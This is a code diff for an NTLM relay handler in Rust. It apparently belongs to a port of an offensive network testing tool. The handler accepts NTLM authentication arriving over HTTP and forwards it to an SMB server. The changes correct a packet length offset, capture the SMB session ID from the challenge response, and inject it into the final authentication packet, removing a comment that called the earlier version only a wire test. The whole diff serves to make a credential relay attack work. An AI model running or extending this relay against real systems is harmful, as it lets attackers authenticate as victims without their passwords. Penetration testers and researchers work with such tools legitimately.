@@ -106,17 +106,12 @@ async fn handle_http_ntlm(
 ) -> Result<()> {
     let mut relay_stream: Option<TcpStream> = None;
     let timeout = std::time::Duration::from_secs(10);
+    let mut session_id: u64 = 0;
+
+    let (reader, mut writer) = stream.split();
+    let mut buf_reader = BufReader::new(reader);
 
     loop {
-        let mut buf = [0u8; 4096];
-        let peek_len = stream.peek(&mut buf).await?;
-        if peek_len == 0 {
-            break;
-        }
-
-        let (reader, mut writer) = stream.split();
-        let mut buf_reader = BufReader::new(reader);
-
         // Read the HTTP request line + headers
         let mut request_line = String::new();
         let n = buf_reader.read_line(&mut request_line).await?;
@@ -187,7 +182,7 @@ async fn handle_http_ntlm(
                                                 // Send SESSION_SETUP with Type 1 to extract Challenge
                                                 let proto = nxc_protocols::smb::SmbProtocol::new();
                                                 let mut pkt = proto.build_session_setup_base();
-                                                pkt[62..64].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
+                                                pkt[78..80].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
                                                 pkt.extend_from_slice(&ntlm_bytes);
 
                                                 if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
@@ -200,6 +195,9 @@ async fn handle_http_ntlm(
                                                             let signature = b"NTLMSSP\0\x02\x00\x00\x00";
                                                             if let Some(pos) = resp.windows(signature.len()).position(|w| w == signature) {
                                                                 relay_stream = Some(smb_stream);
+                                                                if resp.len() >= 48 {
+                                                                    session_id = u64::from_le_bytes(resp[40..48].try_into().unwrap_or([0; 8]));
+                                                                }
                                                                 resp[pos..].to_vec()
                                                             } else {
                                                                 warn!("Relay: No NTLM Type 2 found in SMB response from {target}");
@@ -260,10 +258,8 @@ async fn handle_http_ntlm(
                                                 if let Some(mut smb_stream) = relay_stream.take() {
                                                     let proto = nxc_protocols::smb::SmbProtocol::new();
                                                     let mut pkt = proto.build_session_setup_base();
-                                                    // For type 3, we don't have SID properly populated yet from earlier packet
-                                                    // but for simplistic relaying this is close enough to test the wire
-                                                    // In a production setup, we'd need to properly parse and inject the SMB Session ID
-                                                    pkt[62..64].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
+                                                    pkt[40..48].copy_from_slice(&session_id.to_le_bytes());
+                                                    pkt[78..80].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
                                                     pkt.extend_from_slice(&ntlm_bytes);
 
                                                     if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
